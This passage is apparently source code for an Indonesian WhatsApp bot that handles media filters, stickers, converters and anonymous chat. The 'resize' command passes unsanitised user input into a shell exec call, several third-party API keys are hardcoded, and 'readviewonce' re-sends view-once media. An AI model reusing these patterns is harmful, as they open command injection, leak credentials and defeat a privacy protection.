const img = await fetch (`https://skizo.tech/api/aimirrorvip?&url=${anu}&filter=${text}`) 
const p = await img.json()
if (p.status !== 200) throw 'Mana gakada'
const imgs = p.generated_image_addresses
const capt = p.time_processing
juna.sendMessage(m.chat, { image: { url: imgs }, caption: `Done Bruh\nWaktu Selesai ${capt}`}, { quoted: m})
}catch (error) {
m.reply(`Masukkan Nama Filter Yang Valid!\nAtau gunakan foto lain\nList Filter :\n- gta5\n- dball\n- naruto\n- cyber\n- killer\n- kyoto\n- bikini\n- iron`)
}
}
break
case 'diffusion': case 'stabledif': case 'diff':{//fix bug 
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!text) throw `Masukan Promptnya\nContoh:\n ${prefix+command} ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K`
m.reply(mess.wait)
try {
let anu = await diff(text)
let hasil = await processing(anu, "enhance");
juna.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
     } catch (e) {
m.reply(eror)
}
}
break
case 'txt2img':{
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!text) throw 'Masukan Promptnya\nContoh:\n1girl, with glasses, in beach'
m.reply(`Proses Ayang`)
try {
let txt = await getBuffer(`https://aemt.me/v1/text2img?text=${text}`)
await juna.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
     } catch (e) {
m.reply('Gagal Convert Gambar') 
}
}
break
case 'aiscene': {//fix bug
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply('Proses')
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/aiscene?url=${anu}` }, caption: 'Done Bruh Kalo Jelek Maapin Ya:<'}, { quoted: m})
}
break
case 'toanime': case 'jadianime': {//fix bug
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply('Proses Ayangg')
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/toanime?url=${anu}` }, caption: 'Done Jadi Anime Ayangg >///<'}, { quoted: m})
}
break
case 'nobg': case 'removebg':{//fix bug
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply(mess.wait)
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/removebg?apikey=GataDios&img=${anu}` }, caption: 'Done Ayangg >///<'}, { quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'resize': {
if (!q) return m.reply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
m.reply(mess.wait) 
let panjang = q.split('x')[0] 
let lebar = q.split('x')[1] 
let media = await juna.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.jpeg')
exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return m.reply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await juna.sendMessage(m.chat, {mimetype: 'image/jpeg', image: buffer453, caption: `Done Ayang>///<`}, { quoted: fkontak })
fs.unlinkSync(ran)
})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'postig': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply(mess.wait)
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/instagram2?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Cie Fotonya Dipost Bot'}, { quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'fgay': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply(mess.wait)
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/${command}?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Awas Ada Gay😱'}, { quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'brazzers': case 'triggered': case 'jail': case 'rip': case 'wanted': case 'fire': case 'beautiful':  case 'wasted':{//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply(mess.wait)
const media = await juna.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPH(media)
juna.sendMessage(m.chat, { image: { url: `https://api.zeeoneofc.my.id/api/image-effect/${command}?apikey=${setting.BotKey}&url=${anu}` }, caption: 'Done Ayang >///<'}, { quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'remini': case 'hd': case 'hdr': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return m.reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
m.reply(mess.wait)
let media = await quoted.download()
let proses = await remini(media, "enhance");
juna.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break

// Converter & Tools Menu
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
m.reply(mess.wait)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
juna.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
m.reply(e)
}
break
case 'patrick': case 'doge': case 'popoci': case 'sponsbob': case 'kawan-sponsbob': case 'awoawo': case 'chat': case 'dbfly': case 'dino-kuning': case 'gojosatoru': case 'hope-boy': case 'jisoo': case 'kr-robot': case 'kucing': case 'manusia-lidi': case 'menjamet': case 'meow': case 'nicholas': case 'tyni'://fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let dinoo = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
let dino = await getBuffer(dinoo)
juna.imgToSticker(m.chat, dino, m, {packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'qc':{//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply ('Masukkan Teks') 
try {
avatar = await juna.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image")
} catch {
avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg'
}
const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": avatar
}
},
"text": text,
"m.replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const qc = Buffer.from(res.data.result.image, "base64");
juna.imgToSticker(m.chat, qc, m, {packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
})
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'lonte': //fix bug 
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
let lontee = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
var lonte = await getBuffer(lontee)
juna.imgToSticker(m.chat, lonte, m, {packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'stiker': case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('sticker', m.sender, _cmd)
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await juna.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await juna.imgToSticker(m.chat, media, m, { packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await juna.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await juna.vidToSticker(m.chat, media, m, { packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
await fs.unlinkSync(media)
} else if (/sticker/.test(mime)) {
let media = await juna.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await juna.imgToSticker(from, media, m, {packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
await fs.unlinkSync(media)
} else m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': case 'wm': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!isPremium) return m.reply(mess.OnlyPrem)
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
addCountCmd('stickerwm', m.sender, _cmd)
let [teks1, teks2] = text.split`|`
if (!teks1) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
if (!teks2) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
m.reply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
juna.imgToSticker(m.chat, media, m, {packname: `${teks1}`, author: `${teks2}`})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
juna.imgToSticker(m.chat, media, m, {packname: `${teks1}`, author: `${teks2}`})
} else {
m.reply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
}
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('smeme', m.sender, _cmd)
 if (!/webp/.test(mime) && /image/.test(mime)) {
m.reply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await juna.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(mee)
let smemee = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
var smeme = await getBuffer(smemee)
await juna.imgToSticker(m.chat, smeme, m, { packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
} else {
m.reply(`Kirim/reply image dengan caption ${prefix + command} text1|text2`)
}
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break 
case 'tourl':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!quoted) return m.reply('Reply Image')
m.reply('Proses') 
let media = await juna.downloadAndSaveMediaMessage(quoted);
if (/image/.test(mime)) {
let anu = await TelegraPh(media);
m.reply(util.format(anu));
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media);
m.reply(util.format(anu));
}
await fs.unlinkSync(media);
}
break;
case 'toimage': case 'toimg': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('toimage', m.sender, _cmd)
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply (`Balas sticker dengan caption *${prefix + command}*`)
m.reply(mess.wait)
let media = await juna.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
juna.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'readvo': case 'readviewonce': {
if (!m.quoted) throw 'Reply gambar/video yang ingin Anda lihat'
  if (m.quoted.mtype !== 'viewOnceMessageV2') throw 'Ini bukan pesan view-once.'
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return juna.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return juna.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
}
break
case'toptv':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const { toPTT } = require('./lib/converter')
const { MessageType } = require('@adiwajshing/baileys')
  let q = m.quoted ? m.quoted : m
  if (!/video|audio/.test(mime)) throw `Balas video atau voice note yang ingin diubah ke mp3 dengan caption *${prefix + command}*`
  let media = await q.download()
let dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
juna.relayMessage(m.chat, dataVideo, {})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) } 
break
case 'tovn': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('tovn', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
m.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
juna.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'toaudio': case 'tomp3':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('tomp3', m.sender, _cmd)
 if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply (`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
m.reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
juna.sendMessage(m.chat, {audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case "ttp": case 'attp':{//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('attp', m.sender, _cmd)
if (!text) return m.reply(`Contoh : ${prefix + command} halo`)
if(text.length > 20) return m.reply("Maksimal 20 karakter")
m.reply(mess.wait)
let ttpp = `https://api.zeeoneofc.my.id/api/canvas/${command}?text=${q}&apikey=${setting.BotKey}`
var ttp = await getBuffer(ttpp)
await juna.imgToSticker(m.chat, ttp, m, { packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'emojimix': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
addCountCmd('emojimix', m.sender, _cmd)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return m.reply(`Contoh : ${prefix + command} 😅+💩`)
if (!emoji2) return m.reply(`Contoh : ${prefix + command} 😅+💩`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
var emj = await getBuffer(res.url)
let encmedia = await juna.imgToSticker(m.chat, emj, m, { packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199`, categories: res.tags })
}
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'nulis':
addCountCmd('nulis', m.sender, _cmd)
m.reply(`*Pilihan Fitur Nulis*
1. ${prefix}nuliskiri
2. ${prefix}nuliskanan
3. ${prefix}foliokiri
4. ${prefix}foliokanan

Contoh:
${prefix}nuliskiri Juna Selebew`)
break
case'nuliskiri': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
m.reply(mess.wait)
const tulisan = body.slice(11)
addCountCmd('nuliskiri', m.sender, _cmd)
juna.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${encodeURIComponent(q)}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("apikey sedang eror"))
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'nuliskanan': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
m.reply(mess.wait)
const tulisan = body.slice(12)
addCountCmd('nuliskanan', m.sender, _cmd)
juna.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${encodeURIComponent(q)}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("apikey sedang eror"))
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'foliokiri': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
m.reply(mess.wait)
const tulisan = body.slice(11)
addCountCmd('foliokiri', m.sender, _cmd)
juna.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${encodeURIComponent(q)}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("apikey sedang eror"))
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'foliokanan': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
m.reply(mess.wait)
const tulisan = body.slice(12)
addCountCmd('foliokanan', m.sender, _cmd)
juna.sendMessage(m.chat, {image:{url:`https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${encodeURIComponent(q)}&apikey=${setting.BotKey}`}, caption: "Nih kak"}, {quoted: m}).catch(async _ => await m.reply("apikey sedang eror"))
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'say':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} juna`)
addCountCmd('say', m.sender, _cmd)
var lang = text.split("--")[1]
if (!lang) lang = 'id'
long = 'id'
function tts(text, long = 'id') {
//console.log(lang, text)
return new Promise((resolve, reject) => {
try {
let tts = gtts(long)
let filePath = path.join(__dirname, './lib', (1 * new Date) + '.wav')
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}

let res
try { res = await tts(text, long) }
catch (e) {
m.reply(e + '')
res = await tts(text)
} finally {
juna.sendMessage(m.chat, {audio: res, mimetype: 'audio/mpeg', ptt: true}, {})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'translate': case 'tr': {
if (!text) return m.reply(`Contoh :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh : ${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh : ${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
try {
let teks = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
translate(teks, { to: args[0] }).then((res) => {
juna.sendText(m.chat, `${res.text}`, m)
})
} catch (e) {
m.reply(`Contoh :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh : ${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh : ${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break

case 'anonymouschat': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
m.reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
case 'keluar': case 'leave': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
m.reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
throw false
}
m.reply('Berhasil keluar dari anonymous chat')
let other = room.other(m.sender)
if (other) await juna.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[room.id]
if (command === 'leave') 
break
}
break
case 'mulai': case 'start': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
m.reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
throw false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
juna.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
m.reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
m.reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
m.reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
throw false
}
let other = romeo.other(m.sender)
if (other) await juna.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
juna.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
m.reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
m.reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case'sendprofile': case'sendprofil':
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
m.reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await juna.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
throw false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var res = await juna.sendContact(partnerJID, [m.sender.split("@")[0]])
juna.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
juna.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: res })
}
break
